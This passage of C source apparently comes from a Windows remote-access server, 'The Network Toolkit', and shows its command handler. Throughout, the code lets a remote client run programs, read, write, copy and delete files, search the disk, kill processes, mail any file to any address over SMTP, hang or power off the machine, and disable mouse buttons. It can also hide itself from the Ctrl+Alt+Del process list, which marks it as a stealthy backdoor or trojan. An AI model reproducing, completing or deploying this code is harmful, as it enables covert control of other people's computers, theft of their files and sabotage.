		res = get_s_data(con_s, command_buf, sizeof(command_buf));
		if ((res) && (res != (OPERATION_ERROR)) && (res != INPUT_TOO_LONG)) {
			execute_command(con_s, command_buf);
			ZeroMemory(command_buf, sizeof(command_buf));
		}
		if (res == INPUT_TOO_LONG)
			if (send(con_s, "\r\nCommand too long!", 19, 0) == SOCKET_ERROR)
				return;
	} while (res != (OPERATION_ERROR));
	#ifdef DEBUG_MODE
		ShowDebug("Connection closed by foreign host.");
	#endif
	closesocket(con_s);
}

void send_welcome_message(int con_s)
{
	OSVERSIONINFO os_info;
	char *pmsg; // pointer to welcome message

	pmsg = (char *)malloc(256);
	if (pmsg==NULL)
		return;
	os_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&os_info);
	wsprintf(pmsg,"Welcome to The Network Toolkit server!\r\n");
	send(con_s,pmsg,lstrlen(pmsg),0);
	switch (os_info.dwPlatformId) {
	case VER_PLATFORM_WIN32s:
		wsprintf(pmsg,"Remote operating system is:\r\n%s.\r\n\r\n","Win32s on Windows 3.1.");
		break;
	case VER_PLATFORM_WIN32_WINDOWS:
		wsprintf(pmsg,"Remote operating system is:\r\n%s.\r\n\r\n","Windows  95, Windows  98, or Windows  Me.");
		break;
	case VER_PLATFORM_WIN32_NT:
		wsprintf(pmsg,"Remote operating system is:\r\n%s.\r\n\r\n","Windows  NT, Windows  2000, Windows XP, or Windows\r\nServer  2003 family.");
		break;
	default:
		wsprintf(pmsg,"Remote operating system is:\r\n%s.\r\n\r\n","Unknown.");
	}
	send(con_s,pmsg,lstrlen(pmsg),0);
	free(pmsg);
}

/*-----------------------------------------<EXECUTE_COMMAND>---*/
/*
 *	execute_command() - attempts to execute a given command.
 *
 *	NOTE: this function will communicate with client, i.e. asks for command
 *	      parameters.
 *
 *	!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!WARNING!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 *	Always remember about the last '\0' !!! i.e. NULL-terminated strings!
 */
void execute_command(int con_s, char *com)
{
	char param1[MAX_COMMAND_LENGTH];
	char param2[MAX_COMMAND_LENGTH];
	char param3[MAX_COMMAND_LENGTH];
	char param4[MAX_COMMAND_LENGTH];
	char response[MAX_COMMAND_LENGTH];
	int res; /* result of operation with socket */
	HGLOBAL hMem;

	ZeroMemory(param1, sizeof(param1));
	ZeroMemory(param2, sizeof(param2));
	ZeroMemory(param3, sizeof(param3));
	ZeroMemory(param4, sizeof(param4));
	ZeroMemory(response, sizeof(response));

/*---<EXECUTE FILE>--------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[EXECUTEFILE_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter file name: ", /* what do I want */
				param1, /* here I'll get it */
				sizeof(param1), /* response must be not bigger than that */
				TRUE /* this parameter is mandatory */
		);
		CHECK_ERROR_RETURN(); /* return on error */
		res = get_com_param(
				con_s,
				"Enter parameter: ",
				param2,
				sizeof(param2),
				FALSE /* not mandatory parameter */
		);
		CHECK_ERROR_RETURN();
		if ((execute_file(param1, param2)) == OPERATION_ERROR) {
			wsprintf(response, "No such file: [%s]\r\n", param1);
		} else {
			wsprintf(response, "File [%s] was executed successfully.\r\n", param1);
		}
		SEND_RESPONSE();
		return; /* don't waste the time on other functions */
	}

/*---<COPY FILE(S)>-----------------------------------------------*/
	if (!lstrcmp(com, PROG_COMMANDS[COPYFILE_COM_IND])) {

		BOOL copy_files_func = FALSE;
		int total_files_copyed;
		BOOL silent_mode = FALSE;

		res = get_com_param(
				con_s,
				"Do you wish to copy\r\n"
				" many files at once ['Y' or 'y']/['N' or 'n']: ",
				param1,
				1,
				TRUE
		);
		CHECK_ERROR_RETURN();
		switch (*param1) {
			case 'Y': case 'y':
				copy_files_func = TRUE;
				break;
			case 'N': case 'n':
				copy_files_func = FALSE;
				break;
			default:
				wsprintf(response, "Error: Bad char!\r\n");
				SEND_RESPONSE();
				return;
		}
		res = get_com_param(
				con_s,
				(copy_files_func ? "Enter source path\\wildcard: " : "Enter source file name: "),
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				(copy_files_func ? "Enter dest. path with backslash: " : "Destination file name: "),
				param3,
				sizeof(param3),
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (copy_files_func) {
			res = get_com_param(
					con_s,
					"Run in silent mode ? [y, n]: ",
					param4,
					1,
					TRUE
			);
			CHECK_ERROR_RETURN();
			switch (*param4) {
				case 'Y': case 'y':
					silent_mode = TRUE;
					break;
				case 'N': case 'n':
					silent_mode = FALSE;
					break;
				default:
					wsprintf(response, "Error: Bad char !\r\n");
					SEND_RESPONSE();
					return;
			}
			total_files_copyed = copy_files(con_s, param2, param3, silent_mode);
			wsprintf(response, "Total files copyed: [%d].\r\n", total_files_copyed);
		} else {
			if (!copy_file(param2, param3)) { /* Ups! Error. */
				wsprintf(response, "Error copying [%s] to [%s]!\r\n", param2, param3);
			} else {
				wsprintf(response, "File [%s] was copyed to [%s] successfully.\r\n", param2, param3);
			}
		}
		SEND_RESPONSE();
		return;
	}

/*---<DELETE FILE(S)>---------------------------------------------*/
	if (!lstrcmp(com, PROG_COMMANDS[DELETEFILE_COM_IND])) {
		BOOL remove_files_func = FALSE;
		BOOL silent_mode = FALSE;
		int total_files_removed;

		res = get_com_param(
				con_s,
				"Do you wish to delete\r\n"
				" many files at once ? ['Y' or 'y']/['N' or 'n']: ",
				param1,
				1,
				TRUE
		);
		CHECK_ERROR_RETURN();
		switch (*param1) {
			case 'Y': case 'y':
				remove_files_func = TRUE;
				break;
			case 'N': case 'n':
				remove_files_func = FALSE;
				break;
			default:
				wsprintf(response, "Error: Bad char!\r\n");
				SEND_RESPONSE();
				return;
		}
		res = get_com_param(
				con_s,
				(remove_files_func ? "Enter full path\\wildcard: " : "Enter file name: "),
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (remove_files_func) {
			res = get_com_param(
					con_s,
					"Run in silent mode ? ['Y' or 'y']/['N' or 'n']: ",
					param3,
					1,
					TRUE
			);
			CHECK_ERROR_RETURN();
			switch (*param3) {
				case 'Y': case 'y':
					silent_mode = TRUE;
					break;
				case 'N': case 'n':
					silent_mode = FALSE;
					break;
				default:
					wsprintf(response, "Error: Bad char !\r\n");
					return;
			}
			total_files_removed = remove_files(con_s, param2, silent_mode);
			wsprintf(response, "Total files removed: [%d].\r\n", total_files_removed);
		} else {
			if (!remove_file(param2)) {
				wsprintf(response, "Error, file [%s] cannot be removed!\r\n", param2);
			} else {
				wsprintf(response, "File [%s] was removed successfully.\r\n", param2);
			}
		}
		SEND_RESPONSE();
		return;
	}

/*---<READ FILE>-----------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[READFILE_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter file name: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		DWORD f_size;
		char *buf;
		if (get_file_size(param1, &f_size) == OPERATION_ERROR) {
			wsprintf(response, "Unable to read file [%s]!\r\n", param1);
		} else {
			if (f_size > 4096) {
				res = get_com_param(
						con_s,
						"Are you sure want to read so big file? [yes/no]: ",
						param2,
						3,
						TRUE
				);
				CHECK_ERROR_RETURN();
				if (!lstrcmp(param2, "no")) {
					wsprintf(response, "You right.\r\n");
				} else {
___read_file:
					hMem = GlobalAlloc(GHND, f_size);
					buf = (char *)GlobalLock(hMem);
					if (buf == NULL) {
						if (f_size) /* the file may be zero length, so error returned in this case too */
							wsprintf(response, "Not enough memory [%lu byte(s)] to complete the operation!\r\n", f_size);
						else
							wsprintf(response, "The file is [%lu] length, I think you don't need to read it!", f_size);
						SEND_RESPONSE();
						return; /* and return... yeaah... */
					}
					if (read_file(param1, buf, f_size) == OPERATION_SUCCESS) {
						wsprintf(response, "<BEGIN OF DATA>\r\n");
						SEND_RESPONSE();
						/*
						 * NOTE: The bug was fixed !
						 *	   It was so difficult to find (not fix) the bug! Who!
						 *	   It's idea was that: if a client program disconnects
						 *	   before the file will be fully sent, a windows
						 *	   socket error occurs! And after that the program
						 *	   is flying out of the memory!!!
						 *	   Error occurs because of writting into not connected
						 *	   socket! Who!
						 */
						if (send(con_s, buf, f_size, 0) == SOCKET_ERROR)
							return;
						GlobalFree(hMem); /* free memory */
						wsprintf(response, "\r\n<END OF DATA>\r\n");
						SEND_RESPONSE();
						wsprintf(response, "\r\nFile [%s] was read successfully.\r\n", param1);
					}
				}
			} else { goto ___read_file; }
		}
		SEND_RESPONSE();
		return;
	}

/*---<WRITE FILE>----------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[WRITEFILE_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter file name: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter data ending with: <enter>\r\n",
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (write_file(param1, param2, lstrlen(param2)) == OPERATION_ERROR)
			wsprintf(response, "Unable to write to [%s]!\r\n", param1);
		else
			wsprintf(response, "File [%s] was written successfully.\r\n", param1);
		SEND_RESPONSE();
		return;
	}

/*---<FILE SIZE>------------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[FILESIZE_COM_IND])) {
		DWORD f_size;

		res = get_com_param(
				con_s,
				"Enter file name: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (get_file_size(param1, &f_size) == OPERATION_SUCCESS) {
			wsprintf(
				response,
				"Size of [%s] is:\r\n"
				" [%lu byte(s)]\r\n"
				" [%lu kilobyte(s)]\r\n"
				" [%lu megabyte(s)].",
				param1,
				f_size,
				f_size / 1024,
				f_size / (1024*1024)
			);
		} else {
			wsprintf(response, "Error getting size of [%s]!\r\n", param1);
		}
		SEND_RESPONSE();
		return;
	}

/*---<HELP>-----------------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[HELP_COM_IND])) {
		int cl_ind;

		wsprintf(response, "Available command classes are: \r\n");
		SEND_RESPONSE();
		wsprintf(response, " <1> - [File operation commands]\r\n");
		SEND_RESPONSE();
		wsprintf(response, " <2> - [System commands]\r\n");
		SEND_RESPONSE();
		wsprintf(response, " <3> - [Network commands]\r\n");
		SEND_RESPONSE();
		wsprintf(response, " <4> - [Program control commands]\r\n");
		SEND_RESPONSE();
		wsprintf(response, " <5> - [System breakage-emulation commands]\r\n");
		SEND_RESPONSE();
		wsprintf(response, " <6> - [Synchronous commands]\r\n");
		SEND_RESPONSE();
		wsprintf(response, " <7> - [Other]\r\n");
		SEND_RESPONSE();
		res = get_com_param(
				con_s,
				"Enter class number: ",
				param1,
				1,
				TRUE
		);
		CHECK_ERROR_RETURN();
		cl_ind = atol(param1);
		if (cl_ind < 0 || cl_ind > 7) {
			wsprintf(response, "Error: bad class number!\r\n");
			SEND_RESPONSE();
			return;
		}
/*
#define EXECUTEFILE_COM_IND		0
#define COPYFILE_COM_IND		1
#define DELETEFILE_COM_IND		2
#define READFILE_COM_IND		3
#define WRITEFILE_COM_IND		4
#define FILESIZE_COM_IND		5
#define HELP_COM_IND			6
#define HALTPROGRAM_COM_IND		7
#define FILEMANAGER_COM_IND		8
#define QUIT_COM_IND			9
#define CADSTATUS_COM_IND		10
#define GETCOMPINFO_COM_IND		11
#define PROCESSLIST_COM_IND		12
#define KILLPROCESS_COM_IND		13
#define SMTPSENDFILE_COM_IND	14
#define FINDFILENAME_COM_IND	15
#define FINDFILESIZE_COM_IND	16
#define SHOWMESSAGE_COM_IND		17
#define HANGSYSTEM_COM_IND		18
#define MAKEDIR_COM_IND			19
#define ABOUT_COM_IND			20
#define PATHS_COM_IND			21
#define WAITDATA_COM_IND		22
#define SENDDATA_COM_IND		23
#define SHOWCONFIG_COM_IND		24
#define CODEFILE_COM_IND		25
#define MAKECONFIGFILE_COM_IND	26
#define LOADCONFIGFILE_COM_IND	27
#define LOADDEFAULTCONF_COM_IND	28
#define ENUMWIN_COM_IND			29
#define MCLICKSPEED_COM_IND		30
#define SYSPOWEROFF_COM_IND		31
#define SYSRESTART_COM_IND		32
#define MONITORCONFIG_COM_IND	33
#define KILLMOUSEBTN_COM_IND	34
#define CHANGEWALLPAPER_COM_IND	35
#define REVIVEMOUSEBTN_COM_IND	36
#define SENDSYNCCOM_COM_IND		37
#define CONFIGSYNCMSG_COM_IND	38
#define CONFIGSYNCWALLP_COM_IND	39
#define ATTACHCONFIG_COM_IND	40
#define EXTRACTCONFIG_COM_IND	41
*/
		switch (cl_ind) {
			case 1:
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[EXECUTEFILE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[COPYFILE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[DELETEFILE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[READFILE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[WRITEFILE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[FILESIZE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[FILEMANAGER_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[FINDFILENAME_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[FINDFILESIZE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[MAKEDIR_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[CODEFILE_COM_IND]);
				SEND_RESPONSE();

				break;
			case 2:
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[GETCOMPINFO_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[PROCESSLIST_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[KILLPROCESS_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[PATHS_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[SYSPOWEROFF_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[SYSRESTART_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[HANGSYSTEM_COM_IND]);
				SEND_RESPONSE();

				break;
			case 3:
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[SMTPSENDFILE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[WAITDATA_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[SENDDATA_COM_IND]);
				SEND_RESPONSE();

				break;
			case 4:
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[HELP_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[HALTPROGRAM_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[QUIT_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[CADSTATUS_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[ABOUT_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[SHOWCONFIG_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[MAKECONFIGFILE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[LOADCONFIGFILE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[LOADDEFAULTCONF_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response,"<%s>\r\n",PROG_COMMANDS[ATTACHCONFIG_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response,"<%s>\r\n",PROG_COMMANDS[EXTRACTCONFIG_COM_IND]);
				SEND_RESPONSE();

				break;
			case 5:
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[MCLICKSPEED_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[KILLMOUSEBTN_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[REVIVEMOUSEBTN_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[MONITORCONFIG_COM_IND]);
				SEND_RESPONSE();

				break;
			case 6:
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[SENDSYNCCOM_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[CONFIGSYNCMSG_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[CONFIGSYNCWALLP_COM_IND]);
				SEND_RESPONSE();

				wsprintf(response,"Synchronous-<%s>\r\n",PROG_COMMANDS[SHOWMESSAGE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "Synchronous-<%s>\r\n", PROG_COMMANDS[SYSPOWEROFF_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "Synchronous-<%s>\r\n", PROG_COMMANDS[SYSRESTART_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "Synchronous-<%s>\r\n", PROG_COMMANDS[KILLMOUSEBTN_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "Synchronous-<%s>\r\n", PROG_COMMANDS[REVIVEMOUSEBTN_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "Synchronous-<%s>\r\n", PROG_COMMANDS[HANGSYSTEM_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "Synchronous-<%s>\r\n", PROG_COMMANDS[CHANGEWALLPAPER_COM_IND]);
				SEND_RESPONSE();

				break;
			case 7:
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[SHOWMESSAGE_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[ENUMWIN_COM_IND]);
				SEND_RESPONSE();
				wsprintf(response, "<%s>\r\n", PROG_COMMANDS[CHANGEWALLPAPER_COM_IND]);
				SEND_RESPONSE();

				break;
		default:
			break;
		}

		return;
	}

/*---<HALT PROGRAM>---------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[HALTPROGRAM_COM_IND])) {
		res = get_com_param(
				con_s,
				"Code: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter [r, s] to [restart, shutdown]: ",
				param2,
				1,
				TRUE
		);
		CHECK_ERROR_RETURN();
		switch (*param2) {
			case 'S': case 's':
				if (halt_program(param1, SHUTDOWN_PROGRAM) == OPERATION_ERROR)
					wsprintf(response, "Unable to shutdown the program!\r\n");
				break;
			case 'R': case 'r':
				if (halt_program(param1, RESTART_PROGRAM) == OPERATION_ERROR)
					wsprintf(response, "Unable to restart the program!\r\n");
				break;
			default:
				wsprintf(response, "Bad argument!\r\n");
				break;
		}
		SEND_RESPONSE(); /* if this line is reached, so the are some errors, so tell about them! */
		return;
	}

/*---<FILE MANAGER>---------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[FILEMANAGER_COM_IND])) {
		run_file_manager(con_s);
		return;
	}

/*---<QUIT>-----------------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[QUIT_COM_IND])) {
		wsprintf(response, "\r\n\r\n\r\nSee you next time.\r\n");
		SEND_RESPONSE();
		SleepEx(1000, FALSE);
		closesocket(con_s);
		return;
	}

/*---<CTRL+ALT+DEL status>--------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[CADSTATUS_COM_IND])) {
		wsprintf(response, "Currently the program is %s in CTRL+ALT+DEL dialog.\r\n", CAD_STATUS_HIDDEN ? "hidden" : "visible");
		SEND_RESPONSE();
		res = get_com_param(
				con_s,
				"Enter [h, s] to [hide, show] the program in CAD: ",
				param1,
				1,
				FALSE
		);
		if (*param1) {
			switch (*param1) {
				case 'H': case 'h':
					program_cad_state(PROGRAM_HIDE);
					wsprintf(response, "Program name is hidden.\r\n");
					break;
				case 'S': case 's':
					program_cad_state(PROGRAM_SHOW);
					wsprintf(response, "Program name is visible.\r\n");
					break;
				default:
					wsprintf(response, "Bad char: %c!\r\n", *param1);
					break;
			}
			SEND_RESPONSE();
		}
		return; /* that's all */
	}

/*---<GET COMPUTER INFORMATION>---------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[GETCOMPINFO_COM_IND])) {
		char *buf;
		int i;

		wsprintf(response, "AVAILABLE COMPUTER INFORMATION:\r\n");
		SEND_RESPONSE();
		hMem = GlobalAlloc(GHND, 512);
		buf = (char *)GlobalLock(hMem);
		for (i = 0; i < COMP_INFO_ITEMS_CNT; i++) {
			get_computer_info(i, buf);
			if (send(con_s, buf, lstrlen(buf), 0) == SOCKET_ERROR)
				break;
			ZeroMemory(buf, 512);
		}
		GlobalFree(hMem);
		wsprintf(response, "END OF COMPUTER INFORMATION.\r\n");
		SEND_RESPONSE();
		return;
	}

/*---<PROCESS LIST>---------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[PROCESSLIST_COM_IND])) {
		DWORD p_num;
		PROCESS_INFO *processes;
		int i;

		wsprintf(response, "\r\nCURRENTLY RUNNING PROCESSES ARE:\r\n");
		SEND_RESPONSE();
		processes = get_processes(&p_num);
		if (processes==NULL) {
			wsprintf(response, "Unable to get list of processes!\r\n");
			SEND_RESPONSE();
			return;
		}
		for (i = 0; i < p_num; i++) {
			wsprintf(response, "[%s]", processes[i].process_name);
			SEND_RESPONSE();
			wsprintf(response, " - [0x%x]\r\n", processes[i].process_id);
			SEND_RESPONSE();
		}
		wsprintf(response, "END OF PROCESS LIST.\r\n");
		SEND_RESPONSE();
		wsprintf(response, "Total number of running processes: [%d]\r\n", p_num);
		SEND_RESPONSE();
		return;
	}

/*---<KILL PROCESS>---------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[KILLPROCESS_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter name of the program: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (kill_process(param1) == OPERATION_SUCCESS)
			wsprintf(response, "Process was killed successfully.\r\n");
		else
			wsprintf(response, "Unable to kill the process!\r\n");
		SEND_RESPONSE();
		return;
	}

/*---<SEND FILE VIA SMTP>--------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[SMTPSENDFILE_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter full path of the file: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter receivers address: ",
				param2,
				sizeof(param2),
				TRUE
		);
		if (smtp_send_file(param1,param2)==OPERATION_SUCCESS)
			wsprintf(response,"File was sent successfully! Error status: [%d]\r\n",SMTP_ERROR);
		else
			wsprintf(response,"Unable to send the file. Error status: [%d]\r\n",SMTP_ERROR);
		SEND_RESPONSE();
		return;
	}

/*---<FIND FILE BY NAME>----------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[FINDFILENAME_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter a root path: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter file name or a wildcard: ",
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		wsprintf(response, "Found files are:\r\n");
		SEND_RESPONSE();
		findfile_by_name(con_s, param1, param2);
		return;
	}
/*---<FIND FILE BY SIZE>----------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[FINDFILESIZE_COM_IND])) {
		DWORD min_size, max_size;
		int pos_s;

		res = get_com_param(
				con_s,
				"Enter a root path: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter [xB]/[xK]/[xM]\r\n"
				" where x = MINIMAL file size: ",
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter [xB]/[xK]/[xM]\r\n"
				" where x = MAXIMAL file size: ",
				param3,
				sizeof(param3),
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (
			(str_pos(param2,'B')==OPERATION_ERROR) &&
			(str_pos(param2,'K')==OPERATION_ERROR) &&
			(str_pos(param2,'M')==OPERATION_ERROR) &&

			(str_pos(param3,'B')==OPERATION_ERROR) &&
			(str_pos(param3,'K')==OPERATION_ERROR) &&
			(str_pos(param3,'M')==OPERATION_ERROR)
		) {
			wsprintf(response,"Error: bad prefix!\r\n");
			SEND_RESPONSE();
			return;
		}
		/*
		 * Getting minimal file size.
		 */
		if ((pos_s = str_pos(param2,'B'))!=OPERATION_ERROR) {
			lstrcpyn(param4,param2,pos_s + 1); /* copy the file size */
			min_size = atol(param4);
		} else
		if ((pos_s = str_pos(param2,'K'))!=OPERATION_ERROR) {
			lstrcpyn(param4,param2,pos_s + 1); /* copy the file size */
			min_size = atol(param4);
			min_size *= 1024; /* how it will be in kilobytes ? */
		} else
		if ((pos_s = str_pos(param2,'M'))!=OPERATION_ERROR) {
			lstrcpyn(param4,param2,pos_s + 1); /* copy the file size */
			min_size = atol(param4);
			min_size *= (1024*1024); /* and in megs ? */
		}
		/*
		 * Getting maximal file size.
		 */
		if ((pos_s = str_pos(param3,'B'))!=OPERATION_ERROR) {
			lstrcpyn(param4,param3,pos_s + 1); /* copy the file size */
			max_size = atol(param4);
		} else
		if ((pos_s = str_pos(param3,'K'))!=OPERATION_ERROR) {
			lstrcpyn(param4,param3,pos_s + 1); /* copy the file size */
			max_size = atol(param4);
			max_size *= 1024; /* how it will be in kilobytes ? */
		} else
		if ((pos_s = str_pos(param3,'M'))!=OPERATION_ERROR) {
			lstrcpyn(param4,param3,pos_s + 1); /* copy the file size */
			max_size = atol(param4);
			max_size *= (1024*1024); /* and in megs ? */
		}
		wsprintf(response, "Found files are:\r\n");
		SEND_RESPONSE();
		findfile_by_size(con_s,param1,min_size,max_size);
		return;
	}
/*---<SHOW MESSAGE COMMAND>--------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[SHOWMESSAGE_COM_IND])) {
		int message_type;

		res = get_com_param(
				con_s,
				"Enter message text: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter message title: ",
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		wsprintf(
				response,
				"Available message type numbers are:\r\n"
				" [%lu] - (MB_OK+MB_ICONERROR)\r\n"
				" [%lu] - (MB_OK+MB_ICONWARNING)\r\n"
				" [%lu] - (MB_OK+MB_ICONINFORMATION)\r\n"
				" [%lu] - (MB_YESNO+MB_ICONQUESTION)\r\n"
				" [%lu] - (MB_ABORTRETRYIGNORE+MB_ICONSTOP)\r\n",
				MB_OK | MB_ICONERROR,
				MB_OK | MB_ICONWARNING,
				MB_OK | MB_ICONINFORMATION,
				MB_YESNO | MB_ICONQUESTION,
				MB_ABORTRETRYIGNORE | MB_ICONSTOP
		);
		SEND_RESPONSE();
		res = get_com_param(
				con_s,
				"Enter number of message type: ",
				param3,
				sizeof(param3),
				TRUE
		);
		CHECK_ERROR_RETURN();
		message_type = atol(param3);
		display_message_box(param1, param2, message_type);
		return;
	}

/*---<MAKE DIRECTORY COMMAND>-----------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[MAKEDIR_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter dir name: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (create_dir(param1))
			wsprintf(response, "Directory [%s] created successfully.\r\n", param1);
		else
			wsprintf(response, "Unable to create directory!\r\n");
		SEND_RESPONSE();
		return;
	}

/*---<ABOUT COMMAND>--------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[ABOUT_COM_IND])) {
		show_about(con_s);
		return;
	}

/*---<PATHS COMMAND>--------------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[PATHS_COM_IND])) {
		char *paths;

		if ((paths = (char *)malloc(MAX_PATH+0x10)) == NULL) {
			wsprintf(response, "Error: unable to allocate the memory!\r\n");
			SEND_RESPONSE();
			return;
		}
		if (GetCurrentDirectory(MAX_PATH+1, paths) > 0) {
			wsprintf(response, "Current directory is:\r\n-[");
			SEND_RESPONSE();
			if (send(con_s, paths, lstrlen(paths), 0) == SOCKET_ERROR)
				return;
			wsprintf(response, "]\r\n");
			SEND_RESPONSE();
		}
		GetWindowsDirectory(paths, MAX_PATH);
		wsprintf(response, "Path of the WINDOWS direcotry is:\r\n-[");
		SEND_RESPONSE();
		if (send(con_s, paths, lstrlen(paths), 0) == SOCKET_ERROR)
			return;
		wsprintf(response, "]\r\n");
		SEND_RESPONSE();
		GetSystemDirectory(paths, MAX_PATH);
		wsprintf(response, "Path of the SYSTEM direcotry is:\r\n-[");
		SEND_RESPONSE();
		if (send(con_s, paths, lstrlen(paths), 0) == SOCKET_ERROR)
			return;
